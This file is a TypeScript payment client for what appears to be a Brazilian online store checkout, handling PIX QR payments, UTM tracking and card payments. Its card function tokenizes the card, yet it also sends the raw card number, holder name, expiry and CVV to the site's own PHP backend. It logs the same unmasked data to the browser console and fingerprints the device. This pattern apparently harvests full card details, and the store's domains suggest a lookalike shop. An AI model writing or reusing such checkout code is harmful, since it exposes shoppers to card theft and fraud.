const API_CONFIG = {
  API_BASE_URL: "https://monkeycheckout.online/vakinha-luky",
  FRONTEND_URL: "https://legostore.online", // Adicionado baseado no config funcional
}

export interface PixPaymentData {
  amount: number
  email: string
  name?: string
  phone?: string
  cpf?: string
  description?: string
  utm_source?: string
  utm_medium?: string
  utm_campaign?: string
  utm_content?: string
  utm_term?: string
  xcod?: string
  sck?: string
  utm_id?: string
}

export interface CardPaymentData {
  amount: number
  email: string
  name: string
  phone: string
  cpf: string
  description: string
  card: {
    number: string
    holder_name: string
    exp_month: string
    exp_year: string
    cvv: string
  }
  installments: number
  utm_source?: string
  utm_medium?: string
  utm_campaign?: string
  utm_content?: string
  utm_term?: string
  xcod?: string
  sck?: string
  utm_id?: string
}

export interface PixResponse {
  success: boolean
  qrcode?: string
  pixCopiaECola?: string
  pixCode?: string
  token?: string
  message?: string
  error?: string
}

export interface CardPaymentResponse {
  success: boolean
  transaction_id?: string
  status?: string
  error?: string
}

export interface PaymentStatus {
  success: boolean
  status: "PENDING" | "APPROVED" | "REJECTED"
  error?: string
}

function createLogFile(logData: any) {
  if (typeof window !== "undefined") {
    const timestamp = new Date().toISOString()
    const logEntry = {
      timestamp,
      ...logData,
    }

    // Salvar no localStorage para persistência
    const existingLogs = localStorage.getItem("assetpay_debug_logs") || "[]"
    const logs = JSON.parse(existingLogs)
    logs.push(logEntry)

    // Manter apenas os últimos 50 logs
    if (logs.length > 50) {
      logs.splice(0, logs.length - 50)
    }

    localStorage.setItem("assetpay_debug_logs", JSON.stringify(logs, null, 2))

    // Criar arquivo para download
    const logContent = JSON.stringify(logs, null, 2)
    const blob = new Blob([logContent], { type: "application/json" })
    const url = URL.createObjectURL(blob)

    console.log(`[v0] Log salvo - Download disponível em:`, url)
    console.log(`[v0] Para baixar logs, execute no console: 
      const downloadLink = document.createElement('a');
      downloadLink.href = '${url}';
      downloadLink.download = 'assetpay_debug_${timestamp.replace(/[:.]/g, "-")}.json';
      downloadLink.click();
    `)
  }
}

export function getUtmParams() {
  if (typeof window === "undefined") return {}

  const isMobile = window.innerWidth < 768
  console.log(`[UTM] getUtmParams - Dispositivo: ${isMobile ? "Mobile" : "Desktop"}`)

  const savedUtmParams = localStorage.getItem("utmParams")
  if (savedUtmParams) {
    try {
      const parsedParams = JSON.parse(savedUtmParams)
      console.log(`[UTM] ${isMobile ? "Mobile" : "Desktop"} - UTM params carregados do localStorage:`, parsedParams)
      return parsedParams
    } catch (e) {
      console.error(`[UTM] ${isMobile ? "Mobile" : "Desktop"} - Erro ao parsear UTM params do localStorage:`, e)
    }
  } else {
    console.log(`[UTM] ${isMobile ? "Mobile" : "Desktop"} - Nenhum UTM encontrado no localStorage`)
  }

  // Fallback para URL atual se não houver no localStorage
  const urlParams = new URLSearchParams(window.location.search)
  const utmFromUrl = {
    utm_source: urlParams.get("utm_source"),
    utm_medium: urlParams.get("utm_medium"),
    utm_campaign: urlParams.get("utm_campaign"),
    utm_content: urlParams.get("utm_content"),
    utm_term: urlParams.get("utm_term"),
    xcod: urlParams.get("xcod"),
    sck: urlParams.get("sck"),
    utm_id: urlParams.get("utm_id"),
  }

  const filteredUtmFromUrl = Object.fromEntries(
    Object.entries(utmFromUrl).filter(([_, value]) => value !== null && value !== ""),
  )

  if (Object.keys(filteredUtmFromUrl).length > 0) {
    console.log(`[UTM] ${isMobile ? "Mobile" : "Desktop"} - Usando UTM da URL atual como fallback:`, filteredUtmFromUrl)
  } else {
    console.log(`[UTM] ${isMobile ? "Mobile" : "Desktop"} - Nenhum UTM encontrado na URL atual`)
  }

  return filteredUtmFromUrl
}

export async function createPixPayment(data: PixPaymentData): Promise<PixResponse> {
  try {
    console.log("🚀 Iniciando processo de pagamento PIX...")

    // Capturar parâmetros UTM
    const utmParams = getUtmParams()

    // Preparar dados conforme o HTML funcional
    const paymentData = {
      ...utmParams,
      nome: data.name || "",
      email: data.email,
      cpf: data.cpf?.replace(/\D/g, "") || "",
      telefone: data.phone?.replace(/\D/g, "") || "",
      amount: data.amount, // Adicionando o valor no corpo da requisição
    }

    console.log("📤 Enviando dados para API:", {
      valor: data.amount,
      dados: paymentData,
    })

    // Fazer requisição conforme o HTML funcional
    const response = await fetch(`${API_CONFIG.API_BASE_URL}/pagamento.php`, {
      method: "POST",
      headers: {
        "Content-Type": "application/json",
      },
      body: JSON.stringify(paymentData),
    })

    const result = await response.json()
    console.log("📥 Resposta da API:", result)

    if (result.success) {
      return {
        success: true,
        qrcode: result.pixCopiaECola || result.pixCode || result.qrcode,
        pixCopiaECola: result.pixCopiaECola,
        pixCode: result.pixCode,
        token: result.token,
      }
    } else {
      return {
        success: false,
        error: result.message || result.error || "Erro ao criar pagamento PIX",
      }
    }
  } catch (error) {
    console.error("❌ Erro na API PIX:", error)
    return {
      success: false,
      error: "Erro de conexão com a API",
    }
  }
}

export async function createCardPayment(data: CardPaymentData): Promise<CardPaymentResponse> {
  try {
    console.log("[v0] 🟢 Iniciando checkout...")

    const debugInfo = {
      windowExists: typeof window !== "undefined",
      assetPayExists: typeof window !== "undefined" && !!(window as any).AssetPay,
      fingerprintExists: typeof window !== "undefined" && !!(window as any).FingerprintJS,
      amount: data.amount,
    }

    console.log("[v0] 🔍 Verificando bibliotecas:", debugInfo)
    createLogFile({ type: "library_check", data: debugInfo })

    if (typeof window === "undefined") {
      throw new Error("Ambiente não é browser")
    }

    let attempts = 0
    const maxAttempts = 20 // Aumentar tentativas
    while (!(window as any).AssetPay && attempts < maxAttempts) {
      console.log(`[v0] ⏳ Aguardando carregamento do AssetPay... (tentativa ${attempts + 1}/${maxAttempts})`)
      await new Promise((resolve) => setTimeout(resolve, 250)) // Reduzir intervalo
      attempts++
    }

    if (!(window as any).AssetPay) {
      throw new Error("Biblioteca AssetPay não carregada após 5 segundos")
    }

    await new Promise((resolve) => setTimeout(resolve, 100))

    const cardInfo = (data as any).cardData || data.card
    if (!cardInfo) {
      throw new Error("Dados do cartão não encontrados")
    }

    const publicKey = "pk_live_v2D5sJPOcIhr7OFQn6aMUzb80GDHT3BXHz"
    console.log("[v0] 🔑 Configurando AssetPay...")
    ;(window as any).AssetPay.setPublicKey(publicKey)
    ;(window as any).AssetPay.setTestMode(false)

    let expMonth: number
    let expYear: number

    if (cardInfo.expirationMonth && cardInfo.expirationYear) {
      expMonth = Number.parseInt(cardInfo.expirationMonth, 10)
      expYear = Number.parseInt(cardInfo.expirationYear, 10)
    } else if (cardInfo.exp_month && cardInfo.exp_year) {
      expMonth = Number.parseInt(cardInfo.exp_month, 10)
      expYear = Number.parseInt(cardInfo.exp_year, 10)
    } else {
      throw new Error("Dados de expiração do cartão inválidos")
    }

    // Garantir que o ano tenha 4 dígitos
    if (expYear < 100) {
      expYear += 2000
    }

    const cardData = {
      number: cardInfo.number.replace(/\s/g, ""),
      holderName: (cardInfo.holderName || cardInfo.holder_name || "").trim().toUpperCase(),
      expMonth,
      expYear,
      cvv: cardInfo.cvv,
    }

    if (!cardData.number || cardData.number.length < 13) {
      throw new Error("Número do cartão inválido")
    }
    if (!cardData.holderName || cardData.holderName.length < 3) {
      throw new Error("Nome do portador inválido")
    }
    if (!cardData.expMonth || cardData.expMonth < 1 || cardData.expMonth > 12) {
      throw new Error("Mês de expiração inválido")
    }
    if (!cardData.expYear || cardData.expYear < new Date().getFullYear()) {
      throw new Error("Ano de expiração inválido")
    }
    if (!cardData.cvv || cardData.cvv.length < 3) {
      throw new Error("CVV inválido")
    }

    console.log("[v0] 📇 Dados do cartão coletados")
    console.log({
      number: cardData.number.substring(0, 4) + "****" + cardData.number.slice(-4),
      holderName: cardData.holderName,
      expMonth: cardData.expMonth,
      expYear: cardData.expYear,
      cvv: "***",
    })

    let deviceFingerprint = ""
    let visitorId = ""

    try {
      if ((window as any).FingerprintJS) {
        console.log("[v0] 🆔 Gerando VisitorId...")
        const fpPromise = (window as any).FingerprintJS.load()
        const fp = await fpPromise
        const result = await fp.get()
        visitorId = result.visitorId
        deviceFingerprint = visitorId

        console.log("[v0] 🆔 VisitorId gerado")
        console.log({
          visitorId: result.visitorId,
          confidence: result.confidence,
          components: Object.keys(result.components).reduce((acc, key) => {
            acc[key] = {
              value: result.components[key].value,
              duration: result.components[key].duration,
            }
            return acc
          }, {}),
        })
      } else {
        console.log("[v0] ⚠️ FingerprintJS não disponível, gerando fingerprint alternativo...")

        const canvas = document.createElement("canvas")
        const ctx = canvas.getContext("2d")
        if (ctx) {
          ctx.textBaseline = "top"
          ctx.font = "14px Arial"
          ctx.fillText("Device fingerprint", 2, 2)
        }
        const canvasData = canvas.toDataURL()

        const components = {
          userAgent: navigator.userAgent,
          language: navigator.language,
          platform: navigator.platform,
          screen: `${screen.width}x${screen.height}`,
          timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
          canvas: canvasData.substring(0, 100),
        }

        const fingerprint = btoa(JSON.stringify(components)).substring(0, 32)
        deviceFingerprint = fingerprint
        visitorId = fingerprint

        console.log("[v0] 🆔 Fingerprint alternativo gerado:", deviceFingerprint)
      }
    } catch (error) {
      console.log("[v0] ⚠️ Erro ao gerar fingerprint:", error)
      const fallbackData = `${navigator.userAgent}-${Date.now()}-${Math.random()}`
      deviceFingerprint = btoa(fallbackData).substring(0, 32)
      visitorId = deviceFingerprint
      console.log("[v0] 🆔 Fingerprint fallback gerado:", deviceFingerprint)
    }

    console.log("[v0] 🔑 Token do cartão gerado")
    let cardToken = ""
    try {
      cardToken = await (window as any).AssetPay.encrypt(cardData)
      if (!cardToken || typeof cardToken !== "string" || cardToken.length < 10) {
        throw new Error("Token do cartão não foi gerado corretamente")
      }
      console.log(`"${cardToken}"`)
    } catch (error) {
      console.error("[v0] ❌ Erro ao gerar token do cartão:", error)
      throw new Error("Falha na tokenização do cartão: " + error.message)
    }

    console.log("[v0] 🔍 Verificando conectividade com a API...")

    const payload = {
      amount: data.amount,
      cardToken,
      deviceFingerprint,
      cardData: {
        number: cardData.number,
        holderName: cardData.holderName,
        expMonth: cardData.expMonth,
        expYear: cardData.expYear,
        cvv: cardData.cvv,
      },
      name: data.name,
      email: data.email,
      cpf: data.cpf.replace(/\D/g, ""),
      phone: data.phone.replace(/\D/g, ""),
      description: data.description,
      installments: Number((data as any).installments) || 1,
    }

    console.log("[v0] 📤 Payload enviado para backend")
    console.log(payload)

    const logPayload = {
      ...payload,
      cardToken: cardToken.substring(0, 20) + "...",
      cardData: {
        ...payload.cardData,
        number: payload.cardData.number.substring(0, 4) + "****",
        cvv: "***",
      },
    }
    createLogFile({ type: "payment_request", payload: logPayload })

    console.log("[v0] 🌐 Enviando requisição HTTP")
    const requestOptions = {
      method: "POST",
      headers: {
        "Content-Type": "application/json",
        Accept: "application/json",
      },
      body: JSON.stringify(payload),
    }
    console.log({
      url: `${API_CONFIG.API_BASE_URL}/pagamento-cartao.php`,
      options: requestOptions,
    })

    const controller = new AbortController()
    const timeoutId = setTimeout(() => controller.abort(), 30000)

    try {
      console.log("[v0] ⏳ Iniciando requisição fetch...")
      const response = await fetch(`${API_CONFIG.API_BASE_URL}/pagamento-cartao.php`, {
        ...requestOptions,
        signal: controller.signal,
      })

      clearTimeout(timeoutId)

      console.log(`[v0] 📄 Resposta HTTP recebida - Status: ${response.status} `)

      if (!response.ok) {
        const errorText = await response.text()
        console.log(`[v0] ❌ Erro HTTP ${response.status}`)
        console.log(`"${errorText}"`)
        throw new Error(`HTTP ${response.status}: ${response.statusText} - ${errorText}`)
      }

      const result = await response.json()
      console.log("[v0] 📥 Resposta da API:", result)
      createLogFile({ type: "payment_response", response: result, status: response.status })

      if (result.success) {
        return {
          success: true,
          transaction_id: result.transaction_id,
          status: result.status || "approved",
        }
      } else {
        return {
          success: false,
          error: result.message || result.error || "Erro ao processar pagamento por cartão",
        }
      }
    } catch (error) {
      clearTimeout(timeoutId)
      console.log("[v0] ❌ Erro na requisição HTTP")

      if (error.name === "AbortError") {
        throw new Error("Timeout: A requisição demorou mais de 30 segundos")
      }
      throw error
    }
  } catch (error) {
    console.error("[v0] ❌ Erro na API de cartão:", error)
    createLogFile({ type: "payment_error", error: error.toString() })
    return {
      success: false,
      error: error.message || "Erro de conexão com a API de pagamento",
    }
  }
}

export async function checkPaymentStatus(transactionId: string): Promise<PaymentStatus> {
  try {
    console.log("Verificando status para transação:", transactionId)

    const response = await fetch(`${API_CONFIG.API_BASE_URL}/verificar.php`, {
      method: "POST",
      headers: {
        "Content-Type": "application/json",
      },
      body: JSON.stringify({
        idtransaction: transactionId,
      }),
    })

    const result = await response.json()
    console.log("Resposta da verificação:", result)

    return {
      success: result.success,
      status: result.status,
      error: result.error,
    }
  } catch (error) {
    console.error("Erro ao verificar status:", error)
    return {
      success: false,
      status: "PENDING",
      error: "Erro de conexão",
    }
  }
}

export function generateQRCodeUrl(pixCode: string): string {
  return `https://api.qrserver.com/v1/create-qr-code/?size=200x200&data=${encodeURIComponent(pixCode)}&ecc=M&color=000000&bgcolor=FFFFFF&qzone=2&format=png`
}

export function maskCPF(value: string): string {
  return value
    .replace(/\D/g, "")
    .replace(/(\d{3})(\d)/, "$1.$2")
    .replace(/(\d{3})(\d)/, "$1.$2")
    .replace(/(\d{3})(\d{1,2})/, "$1-$2")
    .replace(/(-\d{2})\d+?$/, "$1")
}

export function maskPhone(value: string): string {
  return value
    .replace(/\D/g, "")
    .replace(/(\d{2})(\d)/, "($1) $2")
    .replace(/(\d{5})(\d)/, "$1-$2")
    .replace(/(-\d{4})\d+?$/, "$1")
}

export function maskMoney(value: string): string {
  let v = value.replace(/\D/g, "")
  v = (Number.parseInt(v) / 100).toFixed(2) + ""
  v = v.replace(".", ",")
  v = v.replace(/(\d)(?=(\d{3})+(?!\d))/g, "$1.")
  return v
}

export function validateEmail(email: string): boolean {
  return email.includes("@") && email.includes(".")
}
